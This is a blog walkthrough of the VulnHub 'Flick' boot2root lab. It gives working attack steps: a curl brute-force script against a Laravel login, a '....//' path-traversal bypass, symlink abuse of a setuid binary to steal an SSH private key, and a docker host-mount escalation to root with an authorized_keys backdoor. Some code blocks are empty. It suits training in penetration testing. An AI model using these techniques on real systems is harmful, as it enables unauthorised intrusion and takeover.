Flick by [leonjza](http://www.twitter.com/leonjza) is a new boot2root available for download at [VulnHub](http://vulnhub.com/entry/flick-1,99/). I had quite a bit of fun with this one, and learned a couple of new things as well; like how I like to do some things the hard way. So without further ado, I'll jump right in and describe how I completed the challenge. 

<!--more-->

Flick actually informed me what it's IP address was as soon as it booted up, so there was no need to find it. As usual, I started off with a port scan to identify any services running on the target. 

```
root@kali ~/flick
# echo 172.16.229.158 > ip.txt

```

Only two ports were open; SSH on port 22, and some other service on port 8881. I used netcat to see what was running on port 8881 first. 

```
# nc -v 172.16.229.158 8881
nc: 172.16.229.158 (172.16.229.158) 8881 [8881] open
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> test
OK: test

> password
OK: password

> cat /root/flag.txt
OK: cat /root/flag.txt

> 
```

I tried a few common passwords, sent in long strings to see if the service would crash, tried to find format string bugs, and even fuzzed it with SPIKE but it didn't go wonky, so I had to find this password it was asking for. 

Port 22 was the only other open port, so I connected to it using SSH and got a nice wall of text returned to me (truncated for brevity)

```

```

I repeated the procedure a couple more times and it became clear that whatever this was had been Base 64 encoded multiple times. So I decided to just write a script to keep decoding it until there was nothing left to decode. First I copied the Base 64 encoded text into a file called f.1

```

Next, I created the following script that would decode it and save it as f.N. I didn't know how many times it was encoded so I just decided to try to decode it about 100 times. 

```bash
#!/bin/bash

ctr=1
for i in `seq 1 100`; do 
	nctr=$(($ctr+1))
	base64 -d t/f.${ctr} > t/f.${nctr}
	ctr=$(($ctr+1))
done
echo "done"
```

Finally, I ran the file and at some point it just threw an error message which indicated it had attempted to decode something that wasn't Base 64 encoded. A quick listing showed that 99 new files were created.

```text
root@kali ~/flick
# ./decoder.sh

```

A lot of these were empty files, so I just removed those, which left only the files with decoded text: 

```

```

f.18 contained some garbled text, which was most likely the result of attemping to decode something that wasn't Base 64 encoded. f.17 contained the string tabupJievas8Knoj. This looked promising, and surely enough, when entered into the service running on port 8881, I got a new message:

```
# nc -v 172.16.229.158 8881

OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

```

I understood "door should be open" to indicate that a new service had been launched on the target. Another quick port scan revealed that port 80 had been opened.

Before launching my browser and navigating to the web server, I started up Burp Suite to capture all requests and responses. When that was done, I pointed my browser to http://172.16.229.158 and saw a gallery full of kittens. 

![](/images/2014-08-14/1.png)

There was also a link that led to a login page with the clue "use the demo credentials that have been configured for the first user"

![](/images/2014-08-14/2.png)

I usually leave brute forcing as a last resort, so I started off by running nikto and wfuzz to enumerate the website and look for any hidden directories. As it turned out, this was a bad idea and returned a lot of false positives. Upon closer examination, any resource that didn't exist got redirected to the following dummy page:

![](/images/2014-08-14/3.png)

I started looking at the captures on Burp Suite and noticed that the cookie had the identifier "laravel_session" which had a value that was once again, Base 64 encoded. A quick search for Laravel vulnerabilities led me to an article titled [Laravel cookie forgery, decryption, and RCE](https://labs.mwrinfosecurity.com/blog/2014/04/11/laravel-cookie-forgery-decryption-and-rce/). There were some cool things discussed on there that included remote command execution. Unfortunately, it didn't say which version of Laravel was vulnerable, and I had no idea which version was running on Flick. 

So finally, I decided to try a brute force attack on the login screen. For the life of me, I could not get hydra working with brute forcing HTTP POST forms, so I gave up and just wrote a quick and dirty script to do it for me:

```bash
#!/bin/bash

failed="incorrect"
url="http://172.16.229.158/login/login"
username=demo
cookie="laravel_session=eyJpdiI6IlV1NHpaZXYyRVppeEErajlRY1pRaUs3N29sZkl0RHdTN2xVd0ZxXC8yTHU0PSIsInZhbHVlIjoiR0RVc0JqZFlRMWVxNUJZbDVORGxqZkI1eGg4UEVGUm0zVDdYMVBQSDNMZExpS3JjQ3pYXC85MlcySUd1ZU9XZ0plRFZUQkVUZmIxMklOdHUyQTRxSTdnPT0iLCJtYWMiOiJhM2NkMGJkODI2MzRhZmNkOTIxZjhjMTc4MTkzZDQ2YmVlMGYzM2ZjNDQwNmFjZmZiYzY5NzdlN2NhZGJkYjMyIn0%3D"

for i in `seq 0 9999`; do 
    echo "[+] trying demo${i}"
    curl -s -L -b "${cookie}" --data "_token=Shqv6TmZloWYG0rTDKhMHwidrWcACnmyHNWv5x27&username=${username}&password=demo${i}" "${url}" | grep "${failed}" > /dev/null  2>&1

    if [[ $? -ne 0 ]]; then 
        echo "[+] password is demo${i}"
        break
    fi
done
```

I hoped the password was variant of demo, so for my first test I wanted to try "demo" followed by numbers to see if that would work. Failing that, I'd need to build up a larger wordlist. 

```text
# ./brute-login.sh 
[+] trying demo0
[+] trying demo1
[+] trying demo2
[+] trying demo3
[+] trying demo4
[+] trying demo5
[+] trying demo6
[+] trying demo7
[+] trying demo8
.
.
.
[+] trying demo120
[+] trying demo121
[+] trying demo122
[+] trying demo123
[+] password is demo123
```

So obvious that I could've probably hammered it in myself instead of writing a script. Oh well. 

I punched in the password and logged into the gallery. Having a look around, I noticed a couple of things. First, I could now upload pictures. This gave me the idea of uploading PHP based backdoors. Second, I could now download the pictures, and the interetsing thing about it was the GET request:

![](/images/2014-08-14/4.png)

This looked like it might be vulnerable to local file inclusion. But first, I wanted to try to upload a shell. If that didn't work, local file inclusion would at least let me read some files and hopefully find a way into the server. 

I clicked on the upload link which presented the following webpage:

![](/images/2014-08-14/5.png)

I selected my PHP reverse shell and clicked on the Save button which uploaded it. I was returned to the gallery and found my uploaded file on page 2. The only thing visible here was the download link. 

![](/images/2014-08-14/6.png)

The PHP reverse shell I uploaded would connect back to my machine on port 443, so I made sure I had a netcat listener waiting for the shell. I needed to find a way to "view" the uploaded file. The one URL I could view it was http://172.16.229.158/image/view/qnaovkOgXerJ but alas, it just returned it as regular text:

![](/images/2014-08-14/7.png)

I tried a few more things but it became clear that there was no way to get my reverse shell this way. On to the possible local file inclusion. For this I used Burp Suite's Repeater function to modify the value of filename and quickly send it to the server and get the reply. I started off with attempting to read ../../../../etc/passwd, which failed.

![](/images/2014-08-14/8.png)

I assumed there was some basic filtering going on, so I tried a different approach: ....//....//....//....//etc/passwd

![](/images/2014-08-14/9.png)

Hey it worked! From the passwd file I identified two users on the target; robin and dean. I spent a good amount of time enumerating the target as much as I could, and one of the more helpful clues came from /etc/apache2/services-enabled/000-default

![](/images/2014-08-14/10.png)

This revealed the website's DocumentRoot at /var/www/flick_photos. I remembered the web application was using Laravel, which I wasn't familiar with. After a bit of Googling, I found Laravel on [GitHub](https://github.com/andrewelkins/Laravel-4-Bootstrap-Starter-Site/), and that allowed me to see the Laravel structure. After looking around, I identified a couple of interesting directories; app/config and app/database.

I was able to pull down app/database/production.sqlite from the target. I didn't even have to load it up using sqlite3 as the dump actually displayed the table and fields:

![](/images/2014-08-14/11.png)

I clicked on the Hex tab and was able to more clearly read the contents of the SQLite database. From here I could see the usernames and passwords. 

![](/images/2014-08-14/12.png)

A quick copy and paste, and I had the passwords for robin and dean.

```
robin: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
dean : FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
```

I attempted to SSH into the server with these newly found credentials. The password for robin didn't work, but the password for dean did, and I finally had a shell on the target. 

```
# ssh dean@172.16.229.158

There were two interesting files in dean's home directory; message.txt and read_docker. message.txt contained the following:

Hi Dean,

I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.

The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/

Please call me if you have any troubles!

- --
Ciao
Robin

The script being referred to in the message was the read_docker binary. Running this and passing /home/robin/flick-dev output the following:

```
dean@flick:~$ ./read_docker /home/robin/flick-dev
# Flick-a-photo dev env
RUN apt-get update && apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli && apt-get clean && rm -rf /var/lib/apt/lists/*

CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]
```

run_docker had the setuid bit set and was owned by the user robin. This allowed it to read the contents of the Docker file in robin's directory, even though the directory only had read/write/execute permissions for robin. 

I wondered what I could do with this. I downloaded the binary and examined it in gdb but didn't find vulnerabilities. read_docker was basically reading the contents of /home/robin/flick-dev/Dockerfile, but I could pass it any directory I wanted, so long as it had a Dockerfile in it. Could I read other files in /home/robin if I created symbolic links to it? 

```
dean@flick:~$ ln -s /home/robin/.profile Dockerfile
dean@flick:~$ file Dockerfile 
Dockerfile: broken symbolic link to `/home/robin/.profile'
dean@flick:~$ ./read_docker /home/dean
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi
```

It worked! The file command identified Dockerfile as a broken symbolic link since dean had no read permissions to /home/robin, but that didn't stop read_docker from displaying the contents of the file. First thing I decided to try to read was /home/robin/.ssh/id_rsa, assuming that it existed.  

It did.

```
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ./read_docker /home/dean

-----END RSA PRIVATE KEY-----
```

Armed with robin's private SSH key, I copied it over to my machine as robin_id_rsa, changed the permissions so that it was read only, and logged in to the target as user robin.

```
# ssh -i robin_id_rsa robin@172.16.229.158

robin@flick:~$ 
```

As it turned out, robin had the ability to run at least one command using sudo:

```
robin@flick:~$ sudo -l
Matching Defaults entries for robin on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on this host:
    (root) NOPASSWD: /opt/start_apache/restart.sh
```

Unfortunately I had no read access to this file so I had no idea what it was doing. I noticed that robin's PATH environment variable included /home/robin/bin which didn't exist. I made the assumption that perhaps /opt/start_apache/restart.sh would call some command that didn't have the absolute path specified, and so it would run something in /home/robin/bin instead. So I made copies of every command in /bin that contained a simple command to echo "w00t" if it got executed.

Sadly this was not the case. So I turned my attention to [Docker](https://www.docker.com/), another application I was not familiar with. [Wikipedia](http://en.wikipedia.org/wiki/Docker_\(software\)) described Docker as: 

> Docker is an open-source project that automates the deployment of applications inside software containers, providing that way an additional layer of abstraction and automatization of operating system–level virtualization on Linux.

Fascinating. After ruffling through Docker's manuals and discussions related to Docker on various forums, I learned that I could issue commands that would run in the container. 

First, I was able to identify an image called ubuntu. 

```
robin@flick:~$ docker ps -l
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES
b0f71c63a88c        ubuntu:14.04        /bin/bash           11 days ago         Exited (0) 11 days ago                       sharp_shockley  
```

Next, I was able to run commands in this image as root:

```
robin@flick:~$ docker run ubuntu id
uid=0(root) gid=0(root) groups=0(root)
```

Unfortunately each command would cause the image to exit, and the contents of the image were quite different from the host OS. For example, users robin and dean didn't exist:

```
robin@flick:~$ docker run ubuntu ls -l /home
total 0
```

Looking in /root in the image also showed that it was empty. 

```
robin@flick:~$ docker run ubuntu ls -l /root
total 0
```

Fortunately, I discovered that it was possible to mount the host OS's /root directory into the image's /root directory. This allowed me to access the contents of the host OS's /root and give me an interactive shell on the image: 

```
robin@flick:~$ docker run -t -i -v /root:/root ubuntu /bin/bash
root@ae6c944aba5e:/# ls -l /root
total 8
drwxr-xr-x 2 root root 4096 Aug  1 14:53 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-rw-r--r-- 1 root root   67 Aug  1 14:52 flag.txt
root@ae6c944aba5e:/# 
```

Fantastic! There was a directory 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc in /root, and of course, /root/flag.txt. This flag.txt file was actually a fake flag:

```
root@28cedba12d4b:/root# cat /root/flag.txt 
Errr, you are close, but this is not the flag you are looking for.
```

Ok, there was still the directory. Looking at its contents showed another file called real_flag.txt:

```
root@28cedba12d4b:/root# ls -l /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/
total 4
-rw-r--r-- 1 root root 128 Aug  1 14:53 real_flag.txt
```

Reading this showed a congratulatory message!

```
root@28cedba12d4b:/root# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt 
Congrats!

You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)

ciao for now!

Got the flag, but I still didn't have root on the host OS. To remedy this, I just copied my SSH keys into /root/.ssh. Since this was basically the host OS's /root directory I was writing to, I could now SSH into the server as root:

```
root@28cedba12d4b:/root# mkdir .ssh
root@28cedba12d4b:/root# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC20qgWGJOGR4hVnD+dJlVnq2M3a1d/QzMBLItZ1WY/qGap1budvBn+X27HkW2HhN6MEmShQzNjG7oNSNOwQBGVBaK/p8Z4Kh2m0QmKS1j+q1cexWGfRPenkDvhvDWdROXdhyQfXovz5xuoKTeuJHygQeTHRfz0tRsEuY4l/ws6S0rqOCb8OvyVmnZbcovBbDxl+6q3y5Vh3UNmSPKFcZ0X1dGeEM1Zq0DJXQfUljR+sYd1qOToc59U5Ul/ZS1qkUqwrJWvlcJGlTjoFFwBJI4hVHd1hDiog0FX8STEyp9HS8XQC16oQKWjcbV0M3fDo9OFFFDarY5VqOBnrcKo1OSt root@kali' > .ssh/authorized_keys

Done and done! I had a lot of fun with this one and learned a bit more about Docker along the way. Thanks to leonjza for a great challenge, and to VulnHub for hosting it!
